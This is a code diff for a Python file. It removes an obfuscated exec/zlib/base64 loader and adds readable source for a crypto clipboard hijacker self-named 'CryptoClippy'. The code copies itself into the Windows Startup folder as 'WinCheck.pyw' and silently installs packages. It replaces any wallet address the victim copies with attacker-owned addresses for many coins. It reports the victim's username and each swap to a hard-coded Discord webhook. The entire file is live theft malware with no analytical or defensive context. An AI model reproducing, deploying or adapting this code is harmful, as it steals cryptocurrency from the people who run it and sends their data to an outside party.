@@ -1,1 +1,169 @@
-getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)), ''.join(map(chr, [101,120,101,99])))(getattr(__import__(chr(122)+chr(108)+chr(105)+chr(98)), ''.join(map(chr, [100,101,99,111,109,112,114,101,115,115])))(getattr(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)), ''.join(map(chr, [98,54,52,100,101,99,111,100,101])))(b'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')))
+
+import re
+import os
+import time
+import random
+import shutil
+import subprocess
+import sys
+
+hook = 'https://discord.com/api/webhooks/1418675943748272188/IDqdUzmKu0VHzY9qMz431yaVnH64hvQ6Rnke8aX4BpV8787hEe-Xx08XSjd6gAlB3RcP' 
+thecode = '''
+import re
+import os
+import time
+import random
+import shutil
+import subprocess
+import sys
+
+hook = 'https://discord.com/api/webhooks/1418675943748272188/IDqdUzmKu0VHzY9qMz431yaVnH64hvQ6Rnke8aX4BpV8787hEe-Xx08XSjd6gAlB3RcP' 
+thecode = \'\'\'\'\'\'
+
+appdata = os.getenv('APPDATA')
+startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+if thecode:
+    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
+        f.write(thecode)
+
+coinsssss = {
+    'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'      : r'(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'bnb1[0-9a-z]{38}',
+    'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'      : r'r[0-9a-zA-Z]{24,34}',
+    'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'      : r'addr1[0-9a-z]{58}',
+    'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'      : r'(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
+    'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'     : r'D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}',
+    'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'      : r'T[A-HJ-NP-Za-km-z1-9]{33}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'    : r'0x[a-fA-F0-9]{40}',
+    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'      : r'(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})(?![0-9A-Za-z])',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'X-avax1[0-9a-z]{38}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
+    'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'      : r'G[A-Z2-7]{55}',
+    'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d'     : r'cosmos1[0-9a-z]{38}',
+    '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050'      : r'0x[a-fA-F0-9]{40}',
+    '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA'      : r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'0x[a-fA-F0-9]{40}',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'0x[a-fA-F0-9]{40}',
+}
+
+subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)
+
+def launchnotif():
+    if hook:
+        try:
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
+        except:
+            pass
+
+def clipnotif(old, new):
+    if hook:
+        try: 
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
+        except:
+            pass
+
+def startclipping():
+    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
+    import pyperclip
+    alladdys = [addy for addy, pattern in coinsssss.items()]
+
+    while True:
+        try:
+            clipboard = pyperclip.paste().strip()
+            for addy, pattern in coinsssss.items():
+                if re.fullmatch(pattern, clipboard):
+                    if clipboard in alladdys:
+                        pass
+                    else:
+                        pyperclip.copy(addy)
+                        clipnotif(clipboard, addy)
+            time.sleep(0.25)
+
+        except:
+            time.sleep(1)
+
+launchnotif()
+startclipping()'''
+
+appdata = os.getenv('APPDATA')
+startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+if thecode:
+    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
+        f.write(thecode)
+
+coinsssss = {
+    'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'      : r'\b(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\bbnb1[0-9a-z]{38}\b',
+    'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'      : r'\br[0-9a-zA-Z]{24,34}\b',
+    'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'      : r'\baddr1[0-9a-z]{58}\b',
+    'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'      : r'\b(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}\b(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
+    'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'     : r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b',
+    'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'      : r'\bT[A-HJ-NP-Za-km-z1-9]{33}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'    : r'\b0x[a-fA-F0-9]{40}\b',
+    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'      : r'\b(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})\b(?![0-9A-Za-z])',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\bX-avax1[0-9a-z]{38}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
+    'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'      : r'\bG[A-Z2-7]{55}\b',
+    'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d'     : r'\bcosmos1[0-9a-z]{38}\b',
+    '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050'      : r'\b0x[a-fA-F0-9]{40}\b',
+    '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA'      : r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
+    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
+}
+
+subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)
+
+def launchnotif():
+    if hook:
+        try:
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
+        except:
+            pass
+
+def clipnotif(old, new):
+    if hook:
+        try: 
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
+        except:
+            pass
+
+def startclipping():
+    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
+    import pyperclip
+    alladdys = [addy for addy, pattern in coinsssss.items()]
+
+    while True:
+        try:
+            clipboard = pyperclip.paste().strip()
+            for addy, pattern in coinsssss.items():
+                if re.fullmatch(pattern, clipboard):
+                    if clipboard in alladdys:
+                        pass
+                    else:
+                        pyperclip.copy(addy)
+                        clipnotif(clipboard, addy)
+            time.sleep(0.25)
+
+        except:
+            time.sleep(1)
+
+launchnotif()
+startclipping()
